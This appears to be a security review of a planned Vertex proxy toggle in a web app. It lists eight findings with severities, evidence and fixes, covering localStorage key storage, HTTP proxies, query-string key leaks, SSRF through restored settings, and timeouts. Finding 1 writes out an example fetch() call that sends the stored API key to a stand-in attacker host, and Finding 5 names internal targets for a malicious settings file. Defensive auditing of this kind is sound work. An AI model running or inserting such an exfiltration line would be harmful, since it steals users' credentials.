# Plan Review Report: Vertex CLI Proxy Toggle
**Reviewer Perspective:** Hostile Security Adversary & Vulnerability Auditor
**Date:** 2026-06-02

---

## Finding 1: Plaintext Client-Side Storage of Sensitive API Credentials
- **Severity:** High
- **Location:** Phase 2, section "Requirements" and "Implementation Steps"
- **Flaw:** Storing the `vertexProxyApiKey` in plain, unencrypted browser `localStorage` (`vertex_proxy_api_key`) presents a significant exfiltration vector. If an attacker gains cross-site scripting (XSS) access via any compromised frontend dependency or un-sanitized user input, the proxy credential can be immediately exfiltrated.
- **Failure scenario:** An attacker exploits an XSS vulnerability (or a malicious dependency in node_modules) and executes `fetch('https://attacker.com/leak?key=' + localStorage.getItem('vertex_proxy_api_key'))`. The user's private proxy key is silently sent to the attacker.
- **Evidence:** `src/contexts/ApiProviderContext.tsx:98` and `src/contexts/ApiProviderContext.tsx:101` store provider API keys directly in plain text via the `safeStorage.setItem()` wrapper.
- **Suggested fix:** Obfuscate or encrypt stored keys using a simple client-side secret-derived value, or explicitly document this security boundary in the code and warn the user in the UI about the risks of storing keys in public/shared browsers.

---

## Finding 2: Mixed Content Blocking and API Key Exposure over Insecure HTTP
- **Severity:** High
- **Location:** Phase 2, section "Requirements" and "Implementation Steps"
- **Flaw:** The plan allows HTTP URLs for custom proxies ("Validate URL: HTTPS or localhost for dev.") but fails to enforce a strict block against plain HTTP URLs for public IP ranges. In a production SPA served over HTTPS, any attempt to call a plain HTTP proxy will trigger a browser Mixed Content Security violation and block the request, while still transmitting the API key in plain text over the network before the block/failure occurs if the browser doesn't block it pre-flight.
- **Failure scenario:** The user configures a public HTTP proxy at `http://192.168.1.5:8000` (which is public HTTP on their local network) or a remote HTTP URL. The browser blocks the connection due to mixed content restrictions, showing a console error and blocking the fashion studio. If the request is sent, the sensitive proxy API key is transmitted over unencrypted HTTP, making it vulnerable to interception (MITM).
- **Evidence:** `src/utils/provider-url-validation.ts:97-99` defines how insecure HTTP is validated for general providers, but Phase 2 does not explicitly reuse this validator or specify blocking save when validation fails in `useSettingsModal.ts:137-150` or `SettingsModal.tsx`.
- **Suggested fix:** Enforce strict HTTPS URL validation at the hook/component validation level. If a local IP is used (e.g., `http://127.0.0.1` or `http://localhost`), allow it, but explicitly block public HTTP URLs and warn of mixed content restrictions in production.

---

## Finding 3: API Key Exposure via URL Query Parameters in SDK Requests
- **Severity:** High
- **Location:** Phase 1 & 3, "Overview" and "Architecture"
- **Flaw:** The `@google/genai` SDK is designed to attach the API key to the query string of requests (e.g., `?key=YOUR_API_KEY`) when initialized with browser-compatible configurations. When routing requests through `httpOptions.baseUrl` to `https://cliproxy.monet.uno`, this key is sent as a query parameter. Query parameters are regularly recorded by proxy servers, web server logs (such as nginx/apache access logs on the proxy host), browser history, and network middleboxes, leaking the secret token.
- **Failure scenario:** The user sends a request to the configured proxy server. The proxy logs the complete URL including the query parameters: `POST /v1beta/models/imagen-4.0-fast-generate-001:generateContent?key=vertex_proxy_api_key`. A security breach or simple log exposure at the proxy level exposes the user's credential.
- **Evidence:** The client initialization in `src/services/apiClient.ts:40-45` uses the standard `@google/genai` constructor:
  ```typescript
  geminiClientInstance = new GoogleGenAI({
    apiKey: activeKey,
    ...(customBaseUrl && {
      httpOptions: { baseUrl: customBaseUrl },
    }),
  });
  ```
  The SDK translates this directly into a query parameter key appendment on all fetch endpoints.
- **Suggested fix:** Intercept the client fetch calls or document the security warning that the proxy API key will be transmitted in the URL query string when using the standard `@google/genai` client.

---

## Finding 4: Security Bypass of API Key and Base URL Sync on Page Reload
- **Severity:** Critical
- **Location:** Phase 2, "Implementation Steps"
- **Flaw:** The plan handles saving proxy values to `localStorage` and calling setters in `useSettingsModal` when save is clicked. However, it fails to specify that these settings must be rehydrated and synchronized into the `apiClient.ts` module variables (`customApiKey`, `customBaseUrl`) on application boot.
- **Failure scenario:** The user successfully saves proxy settings. Upon refreshing the page, the settings appear active in the UI (as they load from localStorage). However, since the client module variables in `apiClient.ts` are initialized to `null`, subsequent Gemini calls are sent directly to the public Google API using the default environment variables, bypassing the proxy and leaking the user's IP address and potentially other context details to Google directly.
- **Evidence:** In `src/contexts/ApiProviderContext.tsx:75`, state variables are initialized in React state, but on initial mount there is no automatic call to `setGeminiBaseUrl()` or `setGeminiApiKey()` with the values loaded from `localStorage`.
- **Suggested fix:** Add an initialization effect in `ApiProviderContext.tsx` that triggers on mount to read the saved proxy values and invoke `setGeminiBaseUrl` and `setGeminiApiKey` accordingly.

---

## Finding 5: Client SSRF / Cross-Origin Intrusions via Restored Configurations
- **Severity:** Medium
- **Location:** Phase 2, "Implementation Steps" and `src/hooks/useSettingsModal.ts`
- **Flaw:** Settings restore functionality accepts JSON backups and loads them directly into localStorage. The plan lacks any sanitization or strict schema checking for the restored `vertexProxyUrl`.
- **Evidence:** `src/hooks/useSettingsModal.ts:177` parses files and calls `restoreData(file)` which restores keys into localStorage without structural verification or domain boundaries:
  ```typescript
  await restoreData(file);
  ```
- **Failure scenario:** An attacker constructs a malicious settings JSON file that sets `vertexProxyUrl` to an internal network target (e.g. `http://192.168.1.1/admin/shutdown` or AWS metadata endpoints). They distribute this file, tricking the user into restoring it. When the user performs a studio action, the frontend makes request calls to the internal endpoint, causing unauthorized internal state changes.
- **Suggested fix:** Enforce domain validation (e.g., using `validateProviderBaseUrl` helper) on any URL parameter during settings restoration before saving it to localStorage.

---

## Finding 6: Silent Global Client Contamination and Denial of Service for Video Services
- **Severity:** High
- **Location:** Phase 1 & 2
- **Flaw:** The singleton client instance in `apiClient.ts` is global. Enabling the Vertex Proxy redirects all calls to the proxy base URL. However, the video generation service (`services/gemini/video.ts`) is outside the proxy's capability.
- **Evidence:** `src/services/gemini/video.ts:13` calls `getGeminiClient()`.
- **Failure scenario:** When the proxy is enabled, a user trying to use the video generation features will have those calls routed to `https://cliproxy.monet.uno`. The proxy will reject these calls (e.g. returns 404/500), breaking the video studio completely.
- **Suggested fix:** Introduce a separate `getDirectGeminiClient()` call or bypass mechanism to ensure video and other non-proxy services are never contaminated by the global proxy URL.

---

## Finding 7: Lack of Client-Side Generation Timeout Leading to Resource Exhaustion
- **Severity:** Medium
- **Location:** Phase 3, "Architecture" (looping multiple `generateContent` promises in parallel)
- **Flaw:** When generating multiple images, the plan loops single-image calls in parallel using `Promise.all` but sets no client-side abort signal or timeout. If the proxy hangs or takes too long, the user interface remains stuck indefinitely.
- **Evidence:** `src/services/gemini/image.ts:124-125` uses `Promise.all` over `generateSingleImage` calls without any timeout or cancellation mechanisms.
- **Failure scenario:** The user requests 4 images. The proxy endpoint stalls on the requests. The user is stuck in a permanent loading state, exhausting connection pools.
- **Suggested fix:** Add a client-side timeout wrapper (using `AbortSignal` or a Promise-based timeout) to force failure after a reasonable duration.

---

## Finding 8: Typo and Mismatch in Text Generation Default and Registry Models
- **Severity:** High
- **Location:** Phase 4, "Requirements"
- **Flaw:** The plan proposes changing defaults and references to `gemini-3.5-flash` and `gemini-3.1-pro`. However, in the codebase, the default models are configured in `src/config/modelRegistry.ts`, and helper files in `src/services/gemini/text.ts` use hardcoded strings. If any helper is migrated to a model not defined in the registry, it will cause runtime model resolve errors or inconsistencies in settings dropdowns.
- **Evidence:** `src/config/modelRegistry.ts:84-103` defines text models (`gemini-3.1-pro-preview`, `gemini-3-flash-preview`), and `src/services/gemini/text.ts:6` uses `gemini-2.5-pro`. Changing these defaults without updating the underlying model list and the tests will break model verification.
- **Failure scenario:** The user opens the Settings Modal, but the dropdown doesn't show `gemini-3.5-flash` or the default shows empty, or selecting a model results in invalid lookup exceptions because the list in the registry wasn't properly synchronized with the plan's exact model IDs.
- **Suggested fix:** Synchronize the new models list in `src/config/modelRegistry.ts` exactly with the planned model names and defaults.
